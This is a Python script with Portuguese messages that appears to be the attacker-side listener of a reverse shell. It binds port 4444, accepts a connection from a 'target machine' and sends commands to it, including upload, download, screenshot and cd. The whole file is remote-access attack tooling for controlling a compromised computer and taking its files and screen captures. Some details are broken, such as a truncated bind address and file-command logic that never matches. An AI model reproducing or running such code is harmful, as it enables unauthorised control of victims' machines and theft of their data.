import socket
import termcolor
from termcolor import colored
import json
import os
import subprocess
def data_recv():
    data = ' '
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def data_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def upload_file(file):
    f = open(file, 'rb')
    target.send(f.read())

def download_file(file):
    f = open(file, 'wb')
    target.settimeout(5)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()
def t_commun():
    count = 0
    while True:
        comm = input('* Root@Kali~%s ' % str(ip))
        data_send(comm)
        if comm == 'exit':
           break
        elif comm == 'clear':
            os.system('clear')
        elif comm[:3] == 'cd ':
            pass
        elif comm == 'upload':
            upload_file(comm[7:])
        elif comm == 'download':
            download_file(comm[9:])
        elif comm[:10] == 'screenshot':
            f = open('screenshot%d' % (count), 'wb')
            target.settimeout(5)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1
        elif comm == 'help':
           print(colored('''
           exit: Sair Da sessão Da Maquina Alvo.
           clear: Limpar Terminal da Maquina Alvo.
           help: Ajudar o Usuario em Usar os Comandos.
           upload: Enviar um arquivo para a Máquina de Mestino
           cd + 'DirectoryName': mude para o diretório da máquina de destino.
           download: Fazer Donwload de um arquivo a Maquina de Destino
           Screenshot: Captura de tela.
           '''), 'red')
        else:
            answer = data_recv()
            print(answer)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.169.', 4444))
print(colored('[-] Esperando Por Uma Conecxão[~]', 'red'))
sock.listen(5)

target, ip = sock.accept()
print(colored('(~)Conectado Ao: ' + str(ip), 'red'))
t_commun()
